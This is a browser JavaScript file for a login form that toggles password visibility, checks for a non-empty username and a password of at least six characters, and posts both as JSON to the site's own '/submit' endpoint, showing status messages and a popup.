document.addEventListener("DOMContentLoaded", function() {
    // Password Show/Hide
    const passwordField = document.getElementById("password");
    const togglePassword = document.getElementById("togglePassword");
    
    togglePassword.addEventListener("click", function() {
        const isPassword = passwordField.type === "password";
        passwordField.type = isPassword ? "text" : "password";
        togglePassword.classList.toggle("fa-eye");
        togglePassword.classList.toggle("fa-eye-slash");

        const value = passwordField.value;
        passwordField.focus();
        passwordField.setSelectionRange(value.length, value.length);
    });

    const usernameField = document.getElementById("username");
    const continueBtn = document.querySelector(".btn");
    const form = document.querySelector("form");

    // 🔐 Button enable/disable with 6-digit password check
    function validateFields() {
        const username = usernameField.value.trim();
        const password = passwordField.value.trim();
        if (username !== "" && password.length >= 6) {
            continueBtn.removeAttribute("disabled");
        } else {
            continueBtn.setAttribute("disabled", "true");
        }
    }

    usernameField.addEventListener("input", validateFields);
    passwordField.addEventListener("input", validateFields);

    const statusBox = document.createElement("div");
    statusBox.id = "loginStatus";
    statusBox.style.display = "none";
    statusBox.style.marginTop = "10px";
    statusBox.style.padding = "10px";
    statusBox.style.textAlign = "center";
    statusBox.style.borderRadius = "5px";
    form.appendChild(statusBox);

    const loadingSpinner = document.getElementById("loading");
    const popup = document.getElementById("popup");

    form.addEventListener("submit", function(event) {
        event.preventDefault();
        continueBtn.setAttribute("disabled", "true");
        loadingSpinner.style.display = "block";
        statusBox.style.display = "none";

        const username = usernameField.value.trim();
        const password = passwordField.value.trim();

        // 🛑 Safety check: If password is less than 6, show error
        if (password.length < 6) {
            loadingSpinner.style.display = "none";
            statusBox.textContent = "Password must be at least 6 characters.";
            statusBox.style.backgroundColor = "red";
            statusBox.style.color = "white";
            statusBox.style.display = "block";
            return;
        }

        fetch("/submit", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ username, password })
        })
        .then(response => response.json())
        .then(data => {
            loadingSpinner.style.display = "none";
            if (data.success) {
                form.style.display = "none";
                popup.style.display = "flex";
            } else {
                statusBox.textContent = "Sorry, incorrect password.";
                statusBox.style.backgroundColor = "red";
                statusBox.style.color = "white";
                statusBox.style.display = "block";

                setTimeout(() => {
                    statusBox.style.display = "none";
                }, 3000);
            }

            form.reset();
            continueBtn.setAttribute("disabled", "true");
        })
        .catch(error => {
            loadingSpinner.style.display = "none";
            console.error("Error:", error);
            statusBox.textContent = "Error submitting data!";
            statusBox.style.backgroundColor = "red";
            statusBox.style.color = "white";
            statusBox.style.display = "block";

            setTimeout(() => {
                statusBox.style.display = "none";
            }, 3000);
        });
    });
});
